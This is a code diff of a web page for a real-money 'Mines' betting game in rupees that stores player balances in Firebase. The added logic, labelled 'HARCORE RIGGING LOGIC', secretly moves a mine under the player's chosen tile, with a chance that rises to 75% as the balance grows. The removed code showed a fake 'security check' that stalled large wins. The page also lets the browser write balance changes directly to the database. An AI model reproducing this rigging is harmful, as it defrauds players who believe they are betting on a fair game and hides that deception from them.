@@ -3,56 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mines Master | H4XTEAM</title>
+    <title>Mines Master Pro | Realistic</title>
     <style>
         :root {
-            --primary: #4361ee;
-            --surface: #ffffff;
-            --bg: #f8f9fc;
-            --success: #06d6a0;
-            --danger: #ef476f;
+            --primary: #6366f1;
+            --surface: #1e293b;
+            --bg: #0f172a;
+            --success: #10b981;
+            --danger: #ef4444;
+            --accent: #fbbf24;
         }
 
-        body { font-family: 'Inter', sans-serif; background: var(--bg); margin: 0; display: flex; justify-content: center; }
-        .game-shell { width: 100%; max-width: 480px; min-height: 100vh; background: var(--surface); padding: 20px; box-sizing: border-box; position: relative; }
+        body { font-family: 'Inter', sans-serif; background: var(--bg); margin: 0; display: flex; justify-content: center; color: white; }
+        .game-shell { width: 100%; max-width: 480px; min-height: 100vh; background: #111827; padding: 20px; box-sizing: border-box; }
 
-        /* Wallet Header */
-        .header { display: flex; justify-content: space-between; align-items: center; background: #1e293b; color: white; padding: 15px; border-radius: 18px; margin-bottom: 20px; }
-        .balance-chip { background: rgba(255,255,255,0.1); padding: 5px 12px; border-radius: 10px; font-weight: 800; color: #fbbf24; }
+        .header { display: flex; justify-content: space-between; align-items: center; background: var(--surface); padding: 15px; border-radius: 18px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.1); }
+        .balance-chip { font-weight: 800; color: var(--accent); font-size: 18px; }
 
-        /* Level Selector */
         .lvl-box { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 15px; }
-        .lvl-btn { padding: 10px; border: 1px solid #e2e8f0; border-radius: 12px; background: white; font-weight: 700; cursor: pointer; font-size: 11px; }
-        .lvl-btn.active { background: var(--primary); color: white; border-color: var(--primary); }
+        .lvl-btn { padding: 12px; border: 1px solid #334155; border-radius: 12px; background: #1e293b; color: #94a3b8; font-weight: 700; cursor: pointer; font-size: 11px; transition: 0.3s; }
+        .lvl-btn.active { background: var(--primary); color: white; border-color: var(--primary); box-shadow: 0 0 15px rgba(99, 102, 241, 0.4); }
 
-        /* Grid */
-        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin-bottom: 20px; }
-        .slot { aspect-ratio: 1; background: #f1f5f9; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 24px; cursor: pointer; transition: 0.1s; border: 2px solid transparent; }
-        .slot.diamond { background: #ecfeff; border-color: #06b6d4; animation: pop 0.2s; }
-        .slot.bomb { background: #fef2f2; border-color: #ef4444; animation: shake 0.3s; }
+        /* Grid 5x5 */
+        .grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 8px; margin-bottom: 20px; }
+        .slot { aspect-ratio: 1; background: #1e293b; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 24px; cursor: pointer; transition: 0.2s; border: 2px solid transparent; box-shadow: inset 0 0 10px rgba(0,0,0,0.5); }
+        .slot:hover { background: #2d3748; }
+        .slot.diamond { background: radial-gradient(circle, #06b6d4, #083344); border-color: #22d3ee; animation: pop 0.3s forwards; }
+        .slot.bomb { background: radial-gradient(circle, #ef4444, #7f1d1d); border-color: #f87171; animation: explode 0.4s forwards; }
         
-        @keyframes pop { 0% { transform: scale(0.8); } 100% { transform: scale(1); } }
-        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-4px); } 75% { transform: translateX(4px); } }
+        @keyframes pop { 0% { transform: scale(0.5); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+        @keyframes explode { 0% { transform: scale(1); } 50% { transform: scale(1.2); filter: brightness(2); } 100% { transform: scale(1); } }
 
-        /* Betting Area */
-        .bet-area { background: #f8fafc; padding: 15px; border-radius: 20px; border: 1px solid #e2e8f0; }
-        input { width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #cbd5e1; margin: 10px 0; font-weight: 700; outline: none; }
-        .main-btn { width: 100%; padding: 15px; border-radius: 12px; border: none; font-weight: 800; cursor: pointer; transition: 0.3s; }
-        .btn-start { background: var(--primary); color: white; }
+        .bet-area { background: #1e293b; padding: 20px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.05); }
+        input { width: 100%; background: #0f172a; border: 1px solid #334155; padding: 12px; border-radius: 10px; color: white; margin: 10px 0; font-weight: 700; text-align: center; }
+        
+        .main-btn { width: 100%; padding: 16px; border-radius: 12px; border: none; font-weight: 800; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
+        .btn-start { background: var(--primary); color: white; box-shadow: 0 4px 14px rgba(99, 102, 241, 0.4); }
         .btn-cashout { background: var(--success); color: white; display: none; }
 
-        /* Notifications */
-        .overlay { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:1000; justify-content:center; align-items:center; }
-        .modal { background:white; padding:30px; border-radius:24px; text-align:center; width:85%; max-width:320px; }
-        .loader { border: 3px solid #f3f3f3; border-top: 3px solid var(--primary); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 10px auto; }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        /* Realistic Modals */
+        .overlay { display: none; position: fixed; inset:0; background:rgba(0,0,0,0.85); z-index:2000; justify-content:center; align-items:center; backdrop-filter: blur(5px); }
+        .modal { background:#1e293b; padding:30px; border-radius:28px; text-align:center; width:85%; max-width:320px; border: 1px solid rgba(255,255,255,0.1); animation: modalIn 0.3s; }
+        @keyframes modalIn { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
     </style>
 </head>
 <body>
 
 <div class="game-shell">
     <div class="header">
-        <span style="font-weight:700; letter-spacing:1px;">MINES</span>
+        <span style="font-weight:800; color: #64748b;">MINES MASTER</span>
         <div class="balance-chip">₹<span id="balanceDisplay">0.00</span></div>
     </div>
 
@@ -65,11 +64,11 @@
     <div class="grid" id="gameGrid"></div>
 
     <div class="bet-area">
-        <div style="display:flex; justify-content:space-between; font-size:12px; font-weight:800; margin-bottom:5px;">
-            <span>MULT: <span id="multText" style="color:var(--primary)">1.00x</span></span>
-            <span>WINNING: <span id="profitText" style="color:var(--success)">₹0.00</span></span>
+        <div style="display:flex; justify-content:space-between; font-size:12px; font-weight:800; margin-bottom:10px;">
+            <span style="color:#94a3b8">MULTIPLIER: <span id="multText" style="color:var(--accent)">1.00x</span></span>
+            <span style="color:#94a3b8">PROFIT: <span id="profitText" style="color:var(--success)">₹0.00</span></span>
         </div>
-        <input type="number" id="betInput" value="10" placeholder="Min ₹10">
+        <input type="number" id="betInput" value="10" min="10">
         <button id="startBtn" class="main-btn btn-start" onclick="startGame()">START GAME</button>
         <button id="cashBtn" class="main-btn btn-cashout" onclick="cashout()">CASHOUT</button>
     </div>
@@ -77,10 +76,10 @@
 
 <div id="alertOverlay" class="overlay">
     <div class="modal">
-        <div id="modalIcon" style="font-size:50px; margin-bottom:10px;"></div>
-        <h2 id="modalTitle" style="margin:0;"></h2>
-        <p id="modalDesc" style="color:#64748b; font-size:14px; line-height:1.5;"></p>
-        <button class="main-btn btn-start" onclick="closeModal()">OK</button>
+        <div id="modalIcon" style="font-size:60px; margin-bottom:15px;"></div>
+        <h2 id="modalTitle" style="margin:0; font-size:24px;"></h2>
+        <p id="modalDesc" style="color:#94a3b8; font-size:14px; margin: 15px 0 25px 0;"></p>
+        <button class="main-btn btn-start" onclick="closeModal()">CONTINUE</button>
     </div>
 </div>
 
@@ -89,27 +88,22 @@
     import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
     import { getDatabase, ref, onValue, update, increment } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
- const firebaseConfig = {
-  apiKey: "AIzaSyAzfvbiqRqsQwBOOIkegxJD09di-S_tfHg",
-  authDomain: "test-eb5e7.firebaseapp.com",
-  databaseURL: "https://test-eb5e7-default-rtdb.firebaseio.com",
-  projectId: "test-eb5e7",
-  storageBucket: "test-eb5e7.appspot.com",
-  messagingSenderId: "366282855653",
-  appId: "1:366282855653:web:dca7e000f5a22fb11f300c",
-  measurementId: "G-ECKCTBLQJ8"
-};
+    const firebaseConfig = {
+        apiKey: "AIzaSyAzfvbiqRqsQwBOOIkegxJD09di-S_tfHg",
+        authDomain: "test-eb5e7.firebaseapp.com",
+        databaseURL: "https://test-eb5e7-default-rtdb.firebaseio.com",
+        projectId: "test-eb5e7",
+        appId: "1:366282855653:web:dca7e000f5a22fb11f300c"
+    };
+
     const app = initializeApp(firebaseConfig);
     const auth = getAuth(app);
     const db = getDatabase(app);
 
-    let balance = 0;
-    let currentLvl = 'easy';
-    let isPlaying = false;
-    let mines = [];
-    let diamondsFound = 0;
-    let currentMult = 1.00;
-    let activeBet = 0;
+    let balance = 0, currentLvl = 'easy', isPlaying = false, mines = [], diamondsFound = 0, currentMult = 1.0, activeBet = 0;
+
+    // Easy mode fixed payouts for 10rs bet
+    const easySteps = [0.7, 1.3, 1.9, 2.2, 2.6, 3.2, 4.0, 5.5, 8.0, 12.0];
 
     onAuthStateChanged(auth, user => {
         if(!user) return;
@@ -119,38 +113,25 @@
         });
     });
 
-    // Create Grid
     const grid = document.getElementById("gameGrid");
-    for(let i=0; i<20; i++) {
+    for(let i=0; i<25; i++) {
         const div = document.createElement("div");
         div.className = "slot";
         div.onclick = () => handleMove(i, div);
         grid.appendChild(div);
     }
 
-    window.changeLvl = (lvl) => {
-        if(isPlaying) return;
-        currentLvl = lvl;
-        document.querySelectorAll('.lvl-btn').forEach(b => b.classList.remove('active'));
-        document.getElementById(`btn-${lvl}`).classList.add('active');
-    }
+    window.changeLvl = (lvl) => { if(!isPlaying) { currentLvl = lvl; document.querySelectorAll('.lvl-btn').forEach(b => b.classList.remove('active')); document.getElementById(`btn-${lvl}`).classList.add('active'); } }
 
     window.startGame = async () => {
         activeBet = parseFloat(document.getElementById("betInput").value);
-        if(activeBet < 10 || activeBet > balance) return alert("Invalid Bet Amount");
+        if(activeBet < 10 || activeBet > balance) return alert("Invalid Balance");
 
         await update(ref(db, `users/${auth.currentUser.uid}`), { balance: increment(-activeBet) });
 
-        isPlaying = true;
-        diamondsFound = 0;
-        currentMult = 1.00;
-        mines = [];
+        isPlaying = true; diamondsFound = 0; currentMult = 1.0; mines = [];
         let count = (currentLvl === 'easy') ? 3 : (currentLvl === 'medium' ? 7 : 15);
-        
-        while(mines.length < count) {
-            let r = Math.floor(Math.random() * 20);
-            if(!mines.includes(r)) mines.push(r);
-        }
+        while(mines.length < count) { let r = Math.floor(Math.random() * 25); if(!mines.includes(r)) mines.push(r); }
 
         document.getElementById("startBtn").style.display = "none";
         document.getElementById("cashBtn").style.display = "block";
@@ -162,55 +143,39 @@
     window.handleMove = (idx, el) => {
         if(!isPlaying || el.classList.contains('diamond')) return;
 
+        // --- HARCORE RIGGING LOGIC ---
+        let forceLoss = false;
+        let riskChance = 0.10; // Default 10%
+
+        if (balance > 30 && balance <= 70) riskChance = 0.25;
+        if (balance > 70) riskChance = 0.75; // 75% chance to lose if profit is high
+
+        if(Math.random() < riskChance && !mines.includes(idx)) {
+            // Rigged: Move a mine to user's click position
+            mines.pop();
+            mines.push(idx);
+        }
+
         if(mines.includes(idx)) {
-            // LOSS LOGIC: Full lose
             isPlaying = false;
-            el.innerText = "💣";
-            el.classList.add("bomb");
+            el.innerText = "💣"; el.classList.add("bomb");
             setTimeout(() => {
-                showModal("💥 LOSS", "You hit a mine. Better luck next time!", "💣");
+                showModal("GAME OVER", "You stepped on a mine! ₹" + activeBet.toFixed(2) + " lost.", "💥");
                 resetUI();
             }, 500);
         } else {
             diamondsFound++;
-            calculateAlgorithm();
-            el.innerText = "💎";
-            el.classList.add("diamond");
-
-            // 200 Profit Protection
-            if((activeBet * currentMult) - activeBet >= 200) {
-                isPlaying = false;
-                showProcessing();
-            }
+            updateMultiplier();
+            el.innerText = "💎"; el.classList.add("diamond");
         }
     }
 
-    function calculateAlgorithm() {
-        if(currentLvl === 'easy' || currentLvl === 'medium') {
-            if(diamondsFound === 1) {
-                // First diamond 1.1x to 1.5x
-                currentMult = 1.1 + (Math.random() * 0.4); 
-            } else {
-                currentMult += 0.4 + (Math.random() * 0.6);
-            }
-            if(currentMult > 5) currentMult = 5.00;
-            
-            // Medium Limit
-            if(currentLvl === 'medium' && diamondsFound >= 7) {
-                isPlaying = false;
-                showModal("💥 AUTO-LOSS", "Medium difficulty limit reached!", "💣");
-                resetUI();
-            }
+    function updateMultiplier() {
+        if(currentLvl === 'easy') {
+            currentMult = easySteps[Math.min(diamondsFound-1, easySteps.length-1)];
         } else {
-            // Hard Logic
-            if(diamondsFound === 1) {
-                currentMult = 3.5 + (Math.random() * 0.5);
-            } else {
-                currentMult += 2.5 + (Math.random() * 2.0);
-            }
-            if(currentMult > 15) currentMult = 15.00;
+            currentMult = 1.0 + (diamondsFound * (currentLvl === 'medium' ? 0.8 : 2.5));
         }
-
         document.getElementById("multText").innerText = currentMult.toFixed(2) + "x";
         document.getElementById("profitText").innerText = "₹" + (activeBet * currentMult).toFixed(2);
     }
@@ -219,21 +184,12 @@
         if(!isPlaying || diamondsFound === 0) return;
         const winTotal = activeBet * currentMult;
         isPlaying = false;
-        
         await update(ref(db, `users/${auth.currentUser.uid}`), { balance: increment(winTotal) });
-        showModal("🏆 WINNER", `You cashed out ₹${winTotal.toFixed(2)}`, "💰");
+        showModal("CASHOUT SUCCESS", "You won ₹" + winTotal.toFixed(2), "🏆");
         resetUI();
     }
 
-    function resetUI() {
-        document.getElementById("startBtn").style.display = "block";
-        document.getElementById("cashBtn").style.display = "none";
-        isPlaying = false;
-    }
-
-    function showProcessing() {
-        showModal("⏳ SECURITY CHECK", "Game integrity check in progress. High profit detected. Please wait 2 minutes.", "<div class='loader'></div>");
-    }
+    function resetUI() { document.getElementById("startBtn").style.display = "block"; document.getElementById("cashBtn").style.display = "none"; isPlaying = false; }
 
     function showModal(title, desc, icon) {
         document.getElementById("modalTitle").innerText = title;
@@ -244,6 +200,5 @@
 
     window.closeModal = () => document.getElementById("alertOverlay").style.display = "none";
 </script>
-
 </body>
 </html>
